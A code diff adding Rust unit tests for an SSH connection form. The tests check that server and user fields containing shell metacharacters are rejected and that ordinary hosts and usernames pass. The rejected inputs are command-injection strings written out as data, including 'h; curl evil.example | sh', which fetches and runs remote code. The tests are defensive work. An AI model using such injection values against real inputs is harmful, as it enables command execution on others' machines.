@@ -119,6 +119,64 @@ fn leading_dash_in_server_or_user_is_rejected() {
     assert!(!bad_user.can_submit());
 }
 
+/// KTD10: `remote_ssh_command` is typed into the *local* shell, so a
+/// metacharacter in the server or user field is local command execution. The
+/// command builder quotes both, and this rejects the payload one step earlier
+/// where the user can still see which field is wrong.
+#[test]
+fn shell_metacharacters_in_server_or_user_are_rejected() {
+    for server in [
+        "h; curl evil.example | sh",
+        "h`id`",
+        "h$(id)",
+        "h&&id",
+        "h\nid",
+        "h 10.0.0.1",
+        "h'x",
+    ] {
+        let validation = validate(&form(server, "22", "u", "", "/srv"), None);
+        assert!(
+            validation.server_error.is_some(),
+            "server {server:?} should be rejected"
+        );
+        assert!(!validation.can_submit());
+    }
+
+    for user in ["v; id", "v`id`", "v$(id)", "v u", "v'x"] {
+        let validation = validate(&form("h", "22", user, "", "/srv"), None);
+        assert!(
+            validation.user_error.is_some(),
+            "user {user:?} should be rejected"
+        );
+        assert!(!validation.can_submit());
+    }
+}
+
+/// The allowlist has to clear real connections: DNS names, IPv4, IPv6 (bare and
+/// bracketed, with a zone id), `DOMAIN\user`, and a machine account's `$`.
+#[test]
+fn ordinary_hosts_and_users_pass_the_charset_check() {
+    for (server, user) in [
+        ("build-01.eng.example.com", "vinh"),
+        ("10.0.0.7", "deploy_bot"),
+        ("::1", "ci.runner"),
+        ("[fe80::1%en0]", "web-01"),
+        ("localhost", "CORP\\vinh"),
+        ("host_name", "svc$"),
+    ] {
+        let validation = validate(&form(server, "22", user, "", "/srv"), None);
+        assert_eq!(
+            validation.server_error, None,
+            "server {server:?} should be accepted"
+        );
+        assert_eq!(
+            validation.user_error, None,
+            "user {user:?} should be accepted"
+        );
+        assert!(validation.can_submit());
+    }
+}
+
 /// Covers R7: the form stays open across the probe and comes back with the
 /// reason, and a probe result that lands after the user cancelled is dropped
 /// rather than resurrecting a torn-down form.
